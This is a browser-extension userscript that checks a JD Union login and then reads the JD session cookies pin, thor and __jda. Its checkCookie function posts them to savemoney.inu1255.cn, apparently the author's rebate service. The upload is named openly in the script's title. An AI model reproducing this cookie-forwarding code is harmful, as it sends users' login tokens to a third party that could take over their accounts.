// ==UserScript==
// @name              定期上报京东cookie
// @namespace         https://github.com/inu1255/soulsign-chrome
// @version           1.0.3
// @author            inu1255
// @loginURL          http://union.jd.com
// @updateURL         https://soulsign.inu1255.cn/script/inu1255/%E4%BA%AC%E4%B8%9C%E9%87%91%E8%9E%8DPC.js
// @expire            900e3
// @grant             cookie
// @domain            api.m.jd.com
// @domain            passport.jd.com
// @domain            savemoney.inu1255.cn
// @param             name 账号
// @param             pwd 密码
// ==/UserScript==

exports.run = async function () {
	var {data} = await axios.post(
		"https://api.m.jd.com/api?appid=unionpc&body=%7B%22funName%22:%22getUserBaseByUnionId%22,%22param%22:%7B%22needAccountName%22:1%7D%7D&functionId=union_user_base&loginType=3",
		null,
		{
			headers: {
				origin: "https://union.jd.com",
				"user-agent":
					"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.41",
			},
		}
	);
	if (data.code == 200) {
		let name = data.result.name;
		data = await checkCookie();
		if (data.code == 0) return name;
		throw data.msg;
	}
	throw data;
};

exports.check = async function (param) {
	var {data} = await axios.post(
		"https://api.m.jd.com/api?appid=unionpc&body=%7B%22funName%22:%22getUserBaseByUnionId%22,%22param%22:%7B%22needAccountName%22:1%7D%7D&functionId=union_user_base&loginType=3",
		null,
		{
			headers: {
				origin: "https://union.jd.com",
				"user-agent":
					"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.41",
			},
		}
	);
	if (data.code == 200) {
		let data = await checkCookie();
		if (data.code == 0) return true;
	}
	return false;
};

async function checkCookie() {
	let pin = (await getCookie("https://api.m.jd.com/api", "pin")) || "";
	let thor = (await getCookie("https://api.m.jd.com/api", "thor")) || "";
	let __jda = (await getCookie("https://api.m.jd.com/api", "__jda")) || "";
	var {data} = await axios.post("https://savemoney.inu1255.cn/api/rebate/jdcookie", {
		cookie: `pin=${pin}; thor=${thor}; __jda=${__jda};`,
	});
	return data;
}
